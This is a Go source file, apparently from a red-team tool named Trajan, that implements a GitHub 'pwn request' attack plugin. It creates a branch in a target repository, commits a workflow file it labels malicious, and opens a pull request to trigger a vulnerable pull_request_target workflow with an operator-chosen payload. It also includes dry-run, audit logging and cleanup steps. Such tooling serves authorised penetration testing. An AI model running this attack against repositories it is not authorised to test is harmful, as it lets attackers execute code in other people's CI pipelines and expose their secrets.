package prattack

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/github"
	"github.com/praetorian-inc/trajan/pkg/github/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("github", "pr-attack", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements PR-based attack
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new PR attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"pr-attack",
			"Create malicious PR to trigger vulnerable workflows",
			"github",
			attacks.CategoryCICD,
		),
	}
}

// CanAttack checks if PR attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnPwnRequest)
}

// Execute performs the PR attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Get GitHub client
	ghPlatform, ok := opts.Platform.(*github.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitHub"
		return result, fmt.Errorf("invalid platform type")
	}

	client := ghPlatform.Client()

	// Parse owner/repo
	owner, repo, err := common.ParseOwnerRepo(opts.Target)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	branchName := opts.Branch
	if branchName == "" {
		branchName = fmt.Sprintf("trajan-pr-attack-%s", opts.SessionID)
	}

	// Determine payload
	payload := opts.Payload
	if payload == "" {
		payload = "echo 'PR attack successful - Trajan'"
	}

	// Validate payload
	if opts.Payload != "" {
		if err := common.ValidatePayload(opts.Payload); err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("invalid payload: %v", err)
			return result, err
		}
	}

	if opts.DryRun {
		result.Success = true
		result.Message = "[DRY RUN] Would create malicious PR"
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactPR,
				Identifier:  "pending",
				Description: "Malicious PR",
			},
		}
		return result, nil
	}

	// Get default branch
	defaultBranch, err := common.GetDefaultBranch(ctx, client, owner, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	// Get default branch SHA
	branchSHA, err := common.GetBranchSHA(ctx, client, owner, repo, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	// Create attack branch
	_, err = client.CreateBranch(ctx, owner, repo, branchName, branchSHA)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	// Create malicious workflow file
	workflowPath := ".github/workflows/trajan-pr-attack.yml"
	workflowContent := common.PRAttackPayloadBase64(payload)
	_, err = client.CreateOrUpdateFile(ctx, owner, repo, workflowPath, github.FileContentInput{
		Message: "Add PR attack workflow",
		Content: workflowContent,
		Branch:  branchName,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create workflow: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  workflowPath,
		Description: "Malicious workflow created",
	})

	// Create pull request to trigger workflow
	pr, err := client.CreatePullRequest(ctx, owner, repo, github.PullRequestInput{
		Title: "Update workflow (Trajan Attack)",
		Body:  "This PR triggers vulnerable pull_request_target workflow",
		Head:  branchName,
		Base:  defaultBranch,
	})
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create PR: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactPR,
		Identifier:  fmt.Sprintf("%d", pr.Number),
		Description: "Malicious PR created",
		URL:         pr.HTMLURL,
	})

	result.Success = true
	result.Message = fmt.Sprintf("PR attack successful - PR #%d created", pr.Number)
	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactPR,
			Identifier:  fmt.Sprintf("%d", pr.Number),
			Action:      "close",
			Description: "Close malicious PR",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	ghPlatform, ok := session.Platform.(*github.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}

	client := ghPlatform.Client()

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		// Parse owner/repo from per-result repo (supports org-wide attacks)
		var owner, repo string
		var err error
		if result.Repo != "" {
			owner, repo, err = common.ParseRepoString(result.Repo)
		} else {
			owner, repo, err = common.ParseOwnerRepo(session.Target)
		}
		if err != nil {
			fmt.Fprintf(os.Stderr, "  Skipping cleanup for %s: %v\n", result.Plugin, err)
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactPR:
				prNumber, err := strconv.Atoi(action.Identifier)
				if err != nil {
					return fmt.Errorf("parsing PR number %q: %w", action.Identifier, err)
				}
				if err := client.ClosePullRequest(ctx, owner, repo, prNumber); err != nil {
					return fmt.Errorf("closing PR %d: %w", prNumber, err)
				}
			case attacks.ArtifactBranch:
				if err := client.DeleteBranch(ctx, owner, repo, action.Identifier); err != nil {
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
